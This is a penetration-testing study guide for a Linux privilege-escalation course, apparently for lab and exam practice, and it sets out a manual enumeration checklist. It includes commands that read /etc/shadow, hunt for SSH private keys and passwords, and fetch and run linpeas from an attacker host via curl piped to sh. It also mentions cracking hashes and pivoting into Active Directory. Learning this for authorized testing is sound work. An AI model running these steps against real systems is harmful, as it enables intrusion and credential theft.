# Section 1 — Introduction to Linux Privilege Escalation

> **No lab / no questions** — methodology section. This guide doubles as the **manual enumeration checklist** every later section builds on.
> Companion: `../Foundation/Privilege_Escalation.md` (decision tree, vector priority matrix, flowchart) — this file = the *commands*; that file = the *strategy*. Use together.

**Goal:** low-priv shell → `root`. Root = capture traffic, read any file, harvest creds/SSH keys, and (if domain-joined) pull the NTLM hash to pivot into Active Directory.

**Rule #1: enumeration is the win.** Most Linux privesc is a *misconfiguration you have to find*, not an exploit you run. Automated scripts help but **know the manual checks** — scripts get flagged, miss context, or aren't on the box.

---

## The first 60 seconds (run these immediately on any shell)

```bash
id; whoami; hostname; sudo -l 2>/dev/null      # who am I, what can I sudo (NO password) — #1 fastest win
uname -a; cat /etc/os-release                   # kernel + distro -> public exploits
ls -la ~ ; cat ~/.bash_history 2>/dev/null      # our own loot/history
```
> `sudo -l` is the single highest-value command — NOPASSWD entries → GTFOBins → instant root ~95% of the time. `uname -a`/`/etc/os-release` feed kernel/distro exploit searches. Always run this block before anything else.

---

## Full manual enumeration checklist

### 1 — OS & kernel (exploit surface)
```bash
cat /etc/os-release; uname -a; arch
hostnamectl 2>/dev/null
```
> Distro+version → which tools exist (`gcc`, `python`, `nc`). Kernel version → `searchsploit linux kernel <ver>` (e.g. DirtyCow, DirtyPipe, PwnKit). **Kernel exploits can crash prod — last resort, understand it first.**

### 2 — Running processes / services (esp. as root)
```bash
ps aux | grep -i root            # root-owned processes
ps au                            # terminal-attached procs (other logged-in users)
ps aux --forest                  # parent/child tree
```
> A misconfigured/vulnerable service running **as root** = easy win (Nagios, Exim, Samba, ProFTPd…). e.g. **CVE-2016-9566** = local privesc in Nagios Core < 4.2.4. Watch for custom/backup scripts run by root.

### 3 — Installed packages & versions
```bash
dpkg -l 2>/dev/null | tail -n +6        # Debian/Ubuntu
rpm -qa 2>/dev/null                      # RHEL/CentOS
screen -v; tmux -V; sudo --version       # spot-check known-vuln versions
```
> Out-of-date packages → public PoCs. Classic example: **Screen 4.05.00** has a trivial local root privesc. Always version-check multiplexers, `sudo`, `pkexec`, `polkit`.

### 4 — Logged-in users & who's doing what
```bash
who; w; last -a | head; users
```
> Other active users → lateral-movement / shoulder-surf-the-process-list opportunities (creds passed as CLI args show in `ps`).

### 5 — Home directories, history, SSH keys
```bash
ls -la /home/*; ls -la /root 2>/dev/null
find /home -name '.bash_history' -readable -exec ls -l {} \; 2>/dev/null
find / \( -name 'id_rsa*' -o -name '*.pem' -o -name 'authorized_keys' \) -readable 2>/dev/null
cat ~/.ssh/id_rsa 2>/dev/null
```
> Other users' homes world-readable? `.bash_history` (passwords as args, `ssh user@host`, git creds), `config.json`/`.env` (secrets), `.ssh/id_rsa` (reuse on this or *other* hosts). Cross-ref `arp -a` / `~/.ssh/known_hosts` against any private keys found.

### 6 — Sudo rights
```bash
sudo -l                                  # the moneymaker
```
> `(root) NOPASSWD: /usr/sbin/tcpdump` → check **GTFOBins** for that binary → root. NOPASSWD = no creds needed. Even non-obvious binaries (`tcpdump`, `find`, `vi`, `awk`, `tar`, `git`) are usually exploitable via GTFOBins.

### 7 — Config files & credential hunting
```bash
find / -name '*.conf' -o -name '*.config' -o -name '*.cnf' 2>/dev/null | grep -v /proc
grep -rniE 'password|passwd|pwd|secret|api[_-]?key|token' /var/www /etc /opt /home 2>/dev/null | grep -v Binary | head
```
> `.conf/.config/.env/.cnf`, web roots, app dirs → hardcoded creds for DB / other users / AD. Reuse-test everything found.

### 8 — Readable shadow / hashes in passwd
```bash
cat /etc/shadow 2>/dev/null             # readable? -> crack all hashes
grep -vE ':[x*!]+:' /etc/passwd | grep -E '\$[0-9]'   # hashes inline in passwd (embedded/routers)
```
> `/etc/passwd` is world-readable; an inline `$6$...` hash there (or a readable `/etc/shadow`) → `hashcat -m 1800` / `john` offline. The §1 example shows `sysadm` with a `$6$` hash *in passwd*.

### 9 — Cron jobs (writable script/path = root)
```bash
ls -la /etc/cron* ; cat /etc/crontab
crontab -l 2>/dev/null; ls -la /var/spool/cron/crontabs 2>/dev/null
grep -rl '' /etc/cron.d 2>/dev/null
```
> Root cron + **writable target script** or **relative PATH** or **wildcard injection** → append your command. Combine with `pspy` (next sections) to *see* cron run without root.

### 10 — Disks / unmounted filesystems
```bash
lsblk; df -h; cat /etc/fstab; mount
```
> Unmounted/extra drive you can mount → backups, creds, SSH keys. `/etc/fstab` may even hold mount creds.

### 11 — SUID / SGID binaries
```bash
find / -perm -4000 -type f 2>/dev/null      # SUID
find / -perm -2000 -type f 2>/dev/null      # SGID
```
> SUID-root binary with exploitable functionality (or a GTFOBins entry) → root shell. Compare the list against a clean box; flag anything non-standard/custom.

### 12 — World-writable files & directories
```bash
find / -path /proc -prune -o -type f -perm -o+w -print 2>/dev/null      # writable files
find / -path /proc -prune -o -type d -perm -o+w -print 2>/dev/null      # writable dirs
```
> World-writable **script run by root cron** = trivial root. World-writable dir = drop tools / win a cron file-race. The §1 example exposes `/etc/cron.daily/backup` + `/dmz-backups/backup.sh` writable → classic chain.

---

## Automated helpers (use *after* you understand the manual checks)

| Tool | On box / use |
|------|--------------|
| `linpeas` | best all-in-one — `curl http://LH/linpeas.sh\|sh` or transfer; colour-codes findings |
| `LinEnum.sh` | `~/tools/LinEnum.sh` (lighter, classic) |
| `pspy` | apt-installed — watch cron/processes **without root** (key for cron timing) |
| `linux-exploit-suggester` | `les.sh` — maps `uname -a` → kernel CVEs |
| `linux-smart-enumeration` (`lse.sh`) | tiered verbosity alternative |

> Transfer reflex: `python3 -m http.server 8000` on Kali → `wget http://LH:8000/linpeas.sh -O /tmp/l.sh; sh /tmp/l.sh`. Scripts are loud and miss context — they *supplement* the manual checklist, never replace it.

---

## Exam Notes

- **`sudo -l` + `uname -a` + `id` first, always.** Then SUID, then cron, then creds, then kernel (last — noisy/unstable).
- Vector priority (see Foundation doc): sudo NOPASSWD → cron → SUID/SGID → writable files → creds reuse → kernel exploit.
- **Creds found anywhere → reuse-test** (`su`, SSH, other services, AD). Linux box domain-joined → NTLM hash → pivot to AD.
- World-writable + root-cron is the most common HTB chain — always run both `find ... -perm -o+w` sweeps.
- `/etc/passwd` inline hash and readable `/etc/shadow` are free offline cracks — check both.
- This section = enumeration only; exploitation vectors are §2–§27. No flag to submit for §1.

---

## Quick copy-paste enum block (edit/extend per engagement)

```bash
echo "== ID =="; id; sudo -l 2>/dev/null
echo "== OS =="; uname -a; cat /etc/os-release 2>/dev/null | head -3
echo "== USERS =="; cat /etc/passwd | grep -E 'sh$'; who
echo "== SUID =="; find / -perm -4000 -type f 2>/dev/null
echo "== CRON =="; cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d 2>/dev/null
echo "== WRITABLE =="; find / -path /proc -prune -o -type f -perm -o+w -print 2>/dev/null | grep -vE '^/proc|/sys/'
echo "== SHADOW =="; cat /etc/shadow 2>/dev/null | head
echo "== KEYS =="; find / \( -name 'id_rsa' -o -name 'authorized_keys' \) -readable 2>/dev/null
```
> Drop this in as one block on a fresh shell for instant situational awareness, then dig into whatever it flags.
